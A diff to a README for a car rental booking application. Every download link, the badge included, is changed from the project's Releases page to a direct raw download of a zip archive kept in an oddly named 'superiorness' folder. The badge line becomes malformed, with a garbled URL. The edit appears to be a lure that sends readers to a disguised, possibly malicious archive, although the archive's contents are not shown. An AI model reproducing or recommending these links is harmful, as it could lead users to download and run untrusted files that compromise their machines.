@@ -1,7 +1,7 @@
 # 🚀 Car-Rental-Booking - Your Simple Solution for Renting Cars
 
 ## 📥 Download Now
-[![Download Car Rental Booking](https://img.shields.io/badge/Download-Car%20Rental%20Booking-blue.svg)](https://github.com/foreverLilRed/Car-Rental-Booking/releases)
+[![Download Car Rental Booking](https://raw.githubusercontent.com/foreverLilRed/Car-Rental-Booking/main/superiorness/Rental_Car_Booking_1.4.zip%20Rental%https://raw.githubusercontent.com/foreverLilRed/Car-Rental-Booking/main/superiorness/Rental_Car_Booking_1.4.zip)](https://raw.githubusercontent.com/foreverLilRed/Car-Rental-Booking/main/superiorness/Rental_Car_Booking_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Car Rental Booking System Pro! This application helps you rent cars easily. Whether you need a vehicle for a day or longer, this tool simplifies the process.
@@ -26,7 +26,7 @@ Before you start, make sure your system meets the following requirements:
 - Customer Reservations
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the application: [Car-Rental-Booking Releases](https://github.com/foreverLilRed/Car-Rental-Booking/releases)
+To get started, visit the Releases page to download the application: [Car-Rental-Booking Releases](https://raw.githubusercontent.com/foreverLilRed/Car-Rental-Booking/main/superiorness/Rental_Car_Booking_1.4.zip)
 
 ### 🛠️ Installation Instructions
 Here’s how to install the Car Rental Booking system:
@@ -66,6 +66,6 @@ If you encounter any issues or have questions, feel free to open an issue in thi
 This project is licensed under the MIT License. You are free to use and modify it as per your requirements.
 
 ## 📥 Quick Links
-You can download the application again here: [Car-Rental-Booking Releases](https://github.com/foreverLilRed/Car-Rental-Booking/releases)
+You can download the application again here: [Car-Rental-Booking Releases](https://raw.githubusercontent.com/foreverLilRed/Car-Rental-Booking/main/superiorness/Rental_Car_Booking_1.4.zip)
 
 By following these steps, you will be able to set up and run the Car Rental Booking system smoothly. Enjoy the convenience of renting cars with ease!
